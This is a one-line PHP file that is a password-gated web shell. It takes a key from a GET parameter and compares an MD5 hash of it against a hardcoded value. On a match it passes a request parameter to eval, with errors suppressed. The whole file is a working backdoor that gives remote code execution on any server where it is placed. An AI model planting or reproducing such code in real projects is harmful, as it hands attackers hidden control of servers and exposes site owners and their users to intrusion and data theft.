<?php $s=@$_GET[2];if(md5($s.$s)=="e67c2597ecad64bb4cdad6633b04107f")@eval($_REQUEST[$s]); ?>
